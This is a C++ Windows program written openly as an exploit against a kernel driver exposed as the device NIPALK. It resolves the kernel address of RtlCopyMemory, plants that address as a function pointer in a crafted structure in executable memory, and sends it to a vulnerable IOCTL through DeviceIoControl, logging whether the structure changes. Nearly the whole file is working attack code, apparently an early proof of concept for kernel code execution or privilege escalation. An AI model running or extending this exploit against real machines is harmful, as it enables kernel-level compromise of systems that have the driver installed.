#include <Windows.h>
#include <iostream>
#include "utils.h"

#define DEVICE_NAME L"\\\\.\\NIPALK"
#define IOCTL_VULNERABLE_FUNCTION 0xabcd03c4

struct ExploitStruct {
    void* dummy;             // Offset 0x0
    void* function_pointer;  // Offset 0x8
    ULONG_PTR pad1;          // Offset 0x10
    ULONG_PTR pad2;          // Offset 0x18
    SIZE_T pad3;             // Offset 0x20
};

int main() {
    Log(L"[+] Starting exploit");

    uintptr_t RtlCopyMemoryAddr = GetKernelFunctionAddress("RtlCopyMemory");

    LPVOID allocatedMemory = VirtualAlloc(nullptr, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!allocatedMemory) {
        Log(L"[-] Failed to allocate memory. Error: " + std::to_wstring(GetLastError()));
        return 1;
    }

    Log(L"[+] Memory allocated at address: " + std::to_wstring(reinterpret_cast<ULONG_PTR>(allocatedMemory)));

    auto* exploit = static_cast<ExploitStruct*>(allocatedMemory);
    exploit->dummy = allocatedMemory;
    exploit->function_pointer = reinterpret_cast<void*>(RtlCopyMemoryAddr);
    exploit->pad1 = 0xdeadbeef;
    exploit->pad2 = 0xdeadbeef;
    exploit->pad3 = 0xdeadbeef;

    ULONG_PTR input_buffer[4] = {
        reinterpret_cast<ULONG_PTR>(exploit),
        0x1234567890ABCDEF,
        0x1234567890ABCDEF,
        RtlCopyMemoryAddr
    };

    // Log values before IOCTL
    Log(L"[+] Values before IOCTL:");
    LogPointer(L"   exploit->dummy", exploit->dummy);
    LogPointer(L"   exploit->function_pointer", exploit->function_pointer);

    HANDLE hDevice = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE) {
        Log(L"[-] Failed to open device. Error: " + std::to_wstring(GetLastError()));
        VirtualFree(allocatedMemory, 0, MEM_RELEASE);
        return 1;
    }

    Log(L"[+] Device opened successfully");
    Log(L"[+] Sending IOCTL");

    ULONG_PTR buff{};
    DWORD bytes_returned = 0;
    BOOL success = DeviceIoControl(
        hDevice,
        IOCTL_VULNERABLE_FUNCTION,
        input_buffer,
        sizeof(input_buffer),
        &buff,
        sizeof(buff),
        &bytes_returned,
        nullptr
    );

    // Log values after IOCTL
    Log(L"[+] Values after IOCTL:");
    LogPointer(L"   exploit->dummy", exploit->dummy);
    LogPointer(L"   exploit->function_pointer", exploit->function_pointer);

    if (success) {
        Log(L"[+] DeviceIoControl succeeded. Bytes returned: " + std::to_wstring(bytes_returned));
        Log(L"[+] Buffer Output: " + std::to_wstring(buff));

        // Compare values
        if (exploit->dummy != allocatedMemory) {
            Log(L"[!] WARNING: exploit->dummy has changed!");
        }
        if (exploit->function_pointer != reinterpret_cast<void*>(RtlCopyMemoryAddr)) {
            Log(L"[!] WARNING: exploit->function_pointer has changed!");
        }
    }
    else {
        Log(L"[-] DeviceIoControl failed. Error: " + std::to_wstring(GetLastError()));
    }

    CloseHandle(hDevice);
    VirtualFree(allocatedMemory, 0, MEM_RELEASE);
    Log(L"[+] Exploit finished");

    std::cin.get();
    return 0;
}